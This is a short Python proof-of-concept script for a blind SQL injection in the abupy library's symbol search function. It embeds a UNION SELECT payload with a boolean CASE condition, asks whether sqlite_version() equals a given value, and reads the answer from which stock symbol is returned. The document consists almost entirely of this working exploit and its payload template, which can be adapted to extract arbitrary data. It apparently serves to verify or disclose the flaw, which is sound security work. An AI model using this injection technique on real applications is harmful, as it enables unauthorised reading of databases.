import abupy.MarketBu.ABuSymbol

'''
    payload:
        "us10101' union select case when {code} then 'usJASNW' else 'usTROVW' end where ''='"

    when payload you entered is true, the result is {'JASNW': 'JASON INDS INC'}, else result is {'TROVW': 'TROVAGENE INC'}
'''

payload = "us10101' union select case when {} then 'usJASNW' else 'usTROVW' end where ''='"

result1 = abupy.MarketBu.ABuSymbol.search_to_symbol_dict(payload.format("sqlite_version() = '3.31.1'"))
result2 = abupy.MarketBu.ABuSymbol.search_to_symbol_dict(payload.format("sqlite_version() != '3.31.1'")) 


if 'JASNW' in result1 and result1['JASNW'] == 'JASON INDS INC':
    if 'TROVW' in result2 and result2['TROVW'] == 'TROVAGENE INC':
        print("Vulnerability exists")
